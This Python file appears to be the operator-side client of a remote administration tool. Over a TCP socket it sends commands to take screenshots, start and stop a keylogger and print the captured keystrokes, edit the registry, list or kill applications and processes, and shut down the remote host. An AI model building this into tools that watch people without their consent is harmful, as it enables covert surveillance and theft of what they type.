import socket
from PIL import Image
import io
import socket


HEADER = 64
PORT = 5050
SERVER = ""
FORMAT = 'utf-8'
DISCONNECT_MSG = "!DISCONNECT"
SCREENSHOT_MSG = "!SCREENSHOT"
SHUTDOWN_MSG = "!SHUTDOWN"
KEYLOG_MSG = "!KEYLOG"
GETAPP_MSG = "!GETAPP"
KILLAPP_MSG = "!KILLAPP"
REGISTRY_MSG = "!REGISTRY"
PROCESS_MSG = "!PROCESS"

keylog_on = False

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def send(msg):
    message = msg.encode(FORMAT)
    msg_len = str(len(message)).encode(FORMAT) 
    msg_len += (b' '*(HEADER - len(msg_len)))
    client.send(msg_len)
    client.send(message)

def receive_screenshot():
    length = int(client.recv(HEADER).decode(FORMAT))
    screenshot_bytes = b''
    while length > 0:
        data = client.recv(min(length, 4096))
        if not data:
            break
        screenshot_bytes += data
        length -= len(data)
    return screenshot_bytes

def display_screenshot(image_bytes):
    if not image_bytes:
        print("Error: No screenshot data received.")
        return
    image_streamIO = io.BytesIO(image_bytes)
    image_streamIO.seek(0)
    image = Image.open(image_streamIO)
    image.show()

def receive():
    msg_len = client.recv(HEADER).decode(FORMAT)
    if msg_len:
        msg_len = int(msg_len)
        msg = client.recv(msg_len).decode(FORMAT)
        return msg
    return ""

def receiveAppList():
    appList_len = int(receive())
    applist = []
    for i in range(appList_len):
        item = []
        for j in range(4):
            item.append(receive())
        applist.append({"description": item[0], "app_id": item[1], "path": (item[2]), "thread": item[3]})
    for item in applist:
        print(item)
    return applist

def receiveProcessList():
    process_list_len = int(receive())
    process_list = []
    for i in range(process_list_len):
        item = []
        for j in range(3):
            item.append(receive())
        process_list.append({"pid": item[0], "name": item[1], "thread": (item[2])})
        print(item)
    # for item in process_list:
    #     print(item)
    return process_list

def start():
    while True:
        msg = input("Enter a message: ")
        global keylog_on
        send(msg)
        if msg == DISCONNECT_MSG or msg == SHUTDOWN_MSG:
            break           
        elif msg == SCREENSHOT_MSG:
            screenshot_data = receive_screenshot()
            display_screenshot(screenshot_data)
        elif msg == KEYLOG_MSG:
            if not keylog_on:
                keylog_on = True
            else:
                keylog_on = False
                print(f"Keylog: {receive()}")
        elif msg == REGISTRY_MSG:
            send(input("Enter command: "))
            print(receive())
        elif msg == GETAPP_MSG:
            receiveAppList()
        elif msg == PROCESS_MSG:
            command = input("Enter command: ")
            send(command)
            if (command.find("GETPROCESS") != -1):
                receiveProcessList()
            else:
                print(receive())
        elif msg == KILLAPP_MSG:
            app_id = input("Enter app ID to kill: ")
            send(app_id)
            print(receive())

def connect(address):
    try:
        client.connect((address, PORT))
        return True
    except:
        print(f'Cannot connect to server {address}\n')
        return False

def tryConnect(ip):
    return connect(ip)
    
           
# while True:
#     while True:
#         SERVER = input('Enter host IP: ')
#         if connect(SERVER):
#             break
#     if SERVER == 'exit':
#         break
#     start()
#     print(f'Disconnected from host {SERVER}\n')
#     client.close()
#     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# client.close()